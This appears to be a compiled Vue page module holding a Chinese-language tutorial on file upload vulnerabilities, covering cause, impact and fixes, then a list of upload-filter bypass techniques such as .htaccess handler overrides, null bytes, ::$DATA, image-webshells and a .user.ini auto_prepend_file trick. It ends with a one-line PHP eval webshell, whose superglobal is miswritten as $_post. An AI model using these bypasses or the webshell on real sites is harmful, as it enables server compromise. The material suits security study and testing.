import{_ as n,p as a,q as s,Z as t}from"./framework-548e1e2a.js";const e={},p=t(`<h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理" aria-hidden="true">#</a> 漏洞原理</h2><blockquote><p>web 应用开放了文件上传功能，并且对上传的文件没有进行足够的限制；另一方面，程序开发部署的时候，没有考虑到系统特性和过滤不严格；再者就是，攻击者通过 web 服务器解析漏洞绕过显示，导致可以上传任意文件。</p></blockquote><h2 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害" aria-hidden="true">#</a> 漏洞危害</h2><ul><li>文件上传漏洞最直接的威胁就是上传任意文件，包括恶意脚本、可执行程序、如果是 Linux 系统且开启了 ssh 可以上传公钥至服务器替换，达到控制服务器的目的。</li><li>如果 web 服务器所保存上传文件的可写目录具有执行权限，那么就可以直接上传后门文件，导致网站沦陷。</li><li>如果攻击者同通过其他漏洞进行提权操作，拿到系统管理权限，那么直接导致服务器沦陷。</li><li>同服务器下的其他网站无一幸免，均会被攻击者控制。</li></ul><h2 id="修复建议" tabindex="-1"><a class="header-anchor" href="#修复建议" aria-hidden="true">#</a> 修复建议</h2><ul><li>将文件上传目录直接设置为不可执行。</li><li>文件类型检查：强烈推荐白名单方式，结合 MIME Type、后缀检查等方式（即只允许允许的文件类型进行上传）。</li><li>使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件。</li><li>对于图片的处理可以使用压缩函数或 resize 函数，处理图片的同时破坏其包含的 HTML 代码。</li><li>单独设置文件服务器的域名。</li></ul><h2 id="测试方法" tabindex="-1"><a class="header-anchor" href="#测试方法" aria-hidden="true">#</a> 测试方法</h2><ul><li>如果是前端检查后缀名，将文件名修改成 <em>test.png</em>，上传后抓包修改成 <strong>test.php</strong>。</li><li>修改 <em>Content-Type</em> 为 <strong>image/png</strong> 等。</li><li>修改文件后缀名，使用大小写或者双写，如 <em>test.PHP</em>、<strong>test.pphphp</strong>。</li><li>上传 .htaccess 文件，文件内容<code>SetHandler application/x-httpd-php</code>，作用是当前目录以及子目录所有文件将会被当作 php 解析。</li><li>使用文件流特性，<strong>test.php::$DATA</strong>。</li><li>文件名后缀加上 <mark>%00</mark>、<strong>0x00</strong>。</li><li>替换文件的头部信息，<strong>&lt;0x89&gt;PNG</strong> <strong>&lt;0x47&gt;GIF</strong> <strong>&lt;0xFF&gt;JEPG</strong>。</li><li>文件后缀名加空格或者点，test.php <strong>test.php.</strong> <strong>test.php..</strong>。</li><li>使用图片马，需要配合文件包含漏洞，<code>copy test.png /b + test.php /a test.jpg</code>。</li><li>使用条件竞争，利用服务端删除文件的时间差，一个线程上传文件，一个线程访问该文件。</li><li>使用<code>.user.ini</code>。</li></ul><p>.user.ini：</p><div class="language-ini" data-ext="ini"><pre class="language-ini"><code><span class="token comment"># 绕过跨目录限制</span>
<span class="token key attr-name">open_basedir</span><span class="token punctuation">=</span><span class="token value attr-value">:/</span>
<span class="token comment"># 在php文件代码执行前用require包含进指定文件</span>
<span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">top.html</span>
<span class="token comment"># 在php文件最后用require包含进指定文件</span>
<span class="token key attr-name">auto_append_file</span><span class="token punctuation">=</span><span class="token value attr-value">down.html</span>

<span class="token comment"># 利用条件</span>
服务器脚本语言为PHP
服务器使用CGI／FastCGI模式
上传目录下要有可执行的php文件
</code></pre></div><p>user.php：</p><div class="language-php" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_post</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;pass&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre></div>`,12),l=[p];function i(o,r){return a(),s("div",null,l)}const d=n(e,[["render",i],["__file","LFU.html.vue"]]);export{d as default};
